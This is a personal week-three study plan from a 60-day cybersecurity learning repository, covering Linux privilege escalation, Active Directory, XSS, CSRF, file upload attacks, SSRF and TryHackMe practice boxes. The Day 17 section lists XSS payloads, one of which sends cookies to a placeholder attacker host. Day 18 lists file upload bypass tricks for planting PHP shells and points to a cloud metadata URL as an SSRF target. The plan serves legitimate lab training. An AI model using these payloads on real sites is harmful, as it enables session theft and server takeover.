# Week 3 Plan — Days 15–21

> **60-Day Cybersecurity Journey** | [GitHub](https://github.com/NivedhithaKS-SEC/cybersec-journey)  
> **Focus:** Linux Privilege Escalation · Active Directory · Web App Attacks · CTF Practice

---

## Week 3 Goals

| Metric | Target |
|--------|--------|
| TryHackMe points | 800+ total |
| GitHub commits | 50+ total |
| Tools built | 1 new tool |
| VDP submissions | 2nd submission done |
| Medium articles | LinkedIn post published (Day 20) |
| CTF rooms completed | 3+ |

---

## Day-by-Day Plan

### Day 15 — Linux Privilege Escalation
**Theme:** How attackers go from low-privilege shell to root

| Task | Resource | Status |
|------|----------|--------|
| TryHackMe: `linuxprivesc` room | tryhackme.com/room/linuxprivesc | [ ] |
| TryHackMe: `linprivesc` room | tryhackme.com/room/linprivesc | [ ] |
| Learn SUID/SGID exploitation | `find / -perm -4000 2>/dev/null` | [ ] |
| Learn sudo misconfigurations | `sudo -l` enumeration | [ ] |
| Learn cron job abuse | Writable cron scripts | [ ] |
| Learn PATH hijacking | Modifying $PATH for privesc | [ ] |
| Build: Linux PrivEsc checklist script | Auto-runs all enumeration commands | [ ] |
| Commit Day15 folder | `git commit -m "Day 15: Linux privesc"` | [ ] |

**Key commands to master:**
```bash
sudo -l                              # What can I sudo?
find / -perm -4000 2>/dev/null       # SUID binaries
find / -writable -type f 2>/dev/null # Writable files
cat /etc/crontab                     # Cron jobs
uname -a && cat /etc/os-release     # Kernel + OS version
ps aux                               # Running processes
env                                  # Environment variables
```

**Tools:** LinPEAS, LinEnum, linux-exploit-suggester

---

### Day 16 — Active Directory Basics
**Theme:** Understanding Windows enterprise environments

| Task | Resource | Status |
|------|----------|--------|
| TryHackMe: `activedirectorybasics` room | Free room | [ ] |
| TryHackMe: `attackingkerberos` room | Check free status | [ ] |
| Learn AD structure: Domain, Forest, OU | Theory + notes | [ ] |
| Learn LDAP, Kerberos, NTLM concepts | How authentication works | [ ] |
| Learn Pass-the-Hash attack | Reuse NTLM hash without cracking | [ ] |
| Learn Kerberoasting | Request TGS tickets for cracking | [ ] |
| Notes: Windows Event IDs reference | 4624, 4625, 4720, 4732, 4768 | [ ] |
| Commit Day16 folder | `git commit -m "Day 16: Active Directory"` | [ ] |

**Key concepts:**
```
Domain Controller (DC)  → Central auth server
LDAP                    → Directory query protocol (port 389)
Kerberos                → Ticket-based auth (port 88)
NTLM                    → Legacy auth (hash-based)
SAM database            → Local password hashes
NTDS.dit                → Domain password hashes
BloodHound              → AD attack path visualiser
```

---

### Day 17 — Web App Attacks: XSS & CSRF
**Theme:** Client-side attacks that target users, not servers

| Task | Resource | Status |
|------|----------|--------|
| TryHackMe: `xss` room | tryhackme.com/room/xss | [ ] |
| TryHackMe: `dvwa` room | Damn Vulnerable Web App | [ ] |
| Learn Reflected XSS | Input reflected directly in response | [ ] |
| Learn Stored XSS | Payload saved to database | [ ] |
| Learn DOM-based XSS | JavaScript processes untrusted data | [ ] |
| Learn CSRF | Trick user's browser into making requests | [ ] |
| Practice: Cookie theft via XSS | `document.cookie` exfil | [ ] |
| Practice: CSRF token bypass | Check if token validated | [ ] |
| Commit Day17 folder + notes | `git commit -m "Day 17: XSS and CSRF"` | [ ] |

**Key payloads to know:**
```javascript
// Basic XSS test
<script>alert(1)</script>

// Cookie theft
<script>document.location='http://attacker.com?c='+document.cookie</script>

// Filter bypass attempts
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
```

---

### Day 18 — File Upload Vulnerabilities + SSRF
**Theme:** Attacks via file upload and internal network abuse

| Task | Resource | Status |
|------|----------|--------|
| TryHackMe: `uploadvulns` room | tryhackme.com/room/uploadvulns | [ ] |
| Learn unrestricted file upload | Upload .php shell as .jpg | [ ] |
| Learn MIME type bypass | Change Content-Type header in Burp | [ ] |
| Learn double extension bypass | `shell.php.jpg` naming tricks | [ ] |
| Learn Server-Side Request Forgery | Make server fetch internal URLs | [ ] |
| Practice SSRF to access metadata | `http://169.254.169.254/` (AWS meta) | [ ] |
| Build: File upload tester notes | Checklist for upload endpoints | [ ] |
| Commit Day18 folder | `git commit -m "Day 18: File upload + SSRF"` | [ ] |

**File upload bypass techniques:**
```
1. Change extension:       shell.php → shell.php5 / shell.phtml
2. Change MIME type:       Content-Type: image/jpeg (but upload .php)
3. Double extension:       shell.php.jpg
4. Null byte:              shell.php%00.jpg
5. Case variation:         shell.PHP / shell.PhP
6. Magic bytes:            Add JPEG header bytes before PHP code
```

---

### Day 19 — CTF Practice Day
**Theme:** Apply everything from Weeks 1–3 on real boxes

| Task | Resource | Status |
|------|----------|--------|
| TryHackMe: `vulnversity` box | Full pentest box — upload vuln | [ ] |
| TryHackMe: `basicpentestingjt` box | Enumerate → exploit → privesc | [ ] |
| TryHackMe: `lazyadmin` box | Linux box — web + privesc | [ ] |
| Document methodology as you go | Recon → Scan → Exploit → Privesc | [ ] |
| Write findings in pentest report format | Apply Day 14 Writing Pentest Reports | [ ] |
| Commit writeup notes | `git commit -m "Day 19: CTF writeups"` | [ ] |

**CTF methodology checklist:**
```
[ ] Nmap full port scan (-sV -sC -p-)
[ ] Web enumeration (Gobuster/Nikto if port 80/443)
[ ] Check all services for default creds
[ ] Search service versions on Exploit-DB
[ ] Get initial shell
[ ] Run LinPEAS/sudo -l/SUID check
[ ] Escalate to root
[ ] Read user.txt and root.txt
```

---

### Day 20 — LinkedIn Post + VDP Submission #2
**Theme:** Visibility + real-world bug hunting

| Task | Resource | Status |
|------|----------|--------|
| Publish LinkedIn 2-week progress post | Planned since Day 14 | [ ] |
| Share Medium article on LinkedIn | "What I Learned About Network Sniffing" | [ ] |
| Research VDP target #2 | HackerOne or Bugcrowd free programs | [ ] |
| Apply OWASP Top 10 knowledge to hunt | Focus: misconfigs, broken access control | [ ] |
| Submit VDP #2 | Document properly with screenshots | [ ] |
| Commit Day20 notes | `git commit -m "Day 20: LinkedIn + VDP #2"` | [ ] |

**LinkedIn post outline (already drafted):**
```
Hook:     "14 days ago I didn't know what a packet was."
Stats:    800+ TryHackMe points, 6 tools built, 1 live app deployed
Lesson:   One thing that surprised me most
CTA:      Link to GitHub + Medium article
Hashtags: #CyberSecurity #TryHackMe #EthicalHacking #WomenInTech #CEH
```

---

### Day 21 — Week 3 Review + Blog Post #3
**Theme:** Consolidate, document, plan Week 4

| Task | Resource | Status |
|------|----------|--------|
| TryHackMe: complete any incomplete rooms | Check path progress | [ ] |
| Write Medium article #3 | "How I Learned Linux Privilege Escalation" | [ ] |
| Update root README.md | Add Week 3 tools + stats | [ ] |
| GitHub audit: all new folders have READMEs | Day15 through Day20 folders | [ ] |
| CEH: Review Modules 12–15 | Hacking web servers, web apps, session | [ ] |
| Plan Week 4 | Create week4-plan.md | [ ] |
| Commit everything | `git commit -m "Day 21: Week 3 review"` | [ ] |

---

## Week 3 TryHackMe Room List

### Priority (do these first)
| Room | URL | Topic |
|------|-----|-------|
| Linux PrivEsc | tryhackme.com/room/linuxprivesc | Privesc |
| Upload Vulnerabilities | tryhackme.com/room/uploadvulns | File upload |
| XSS | tryhackme.com/room/xss | Cross-site scripting |
| Vulnversity | tryhackme.com/room/vulnversity | Full box |
| LazyAdmin | tryhackme.com/room/lazyadmin | Full box |

### Secondary (if time allows)
| Room | URL | Topic |
|------|-----|-------|
| Basic Pentesting | tryhackme.com/room/basicpentestingjt | Full box |
| Crack the Hash | tryhackme.com/room/crackthehash | Password cracking |
| Overpass | tryhackme.com/room/overpass | Full box |
| Hydra | tryhackme.com/room/hydra | Brute force |

---

## Week 3 Tool to Build

**LinPEAS Wrapper / PrivEsc Reporter**
- Run common privesc checks automatically
- Output formatted report with findings
- Language: Python or Bash
- Day target: Day 15

```python
# Planned checks:
# - sudo -l output
# - SUID binaries list
# - Writable files in /etc
# - Cron jobs
# - Kernel version + known exploits lookup
# - Network interfaces and connections
# - Interesting files (passwords, keys, history)
```

---

## Week 3 CEH Modules

| Module | Topic | Day |
|--------|-------|-----|
| Module 12 | Hacking Web Servers | Day 17 |
| Module 13 | Hacking Web Applications | Day 17-18 |
| Module 14 | SQL Injection (deep dive) | Day 18 |
| Module 15 | Hacking Wireless Networks | Day 19 |

---

## Running Totals Target (End of Week 3)

| Metric | End of Week 2 | Target End Week 3 |
|--------|--------------|-------------------|
| TryHackMe points | 630+ | 800+ |
| GitHub commits | 38+ | 55+ |
| Tools built | 5 | 6 |
| Medium articles | 2 | 3 |
| VDP submissions | 1 | 2 |
| TryHackMe rooms | 15+ | 25+ |

---

*Part of my 60-day cybersecurity learning journey.*  
*GitHub: [NivedhithaKS-SEC/cybersec-journey](https://github.com/NivedhithaKS-SEC/cybersec-journey)*
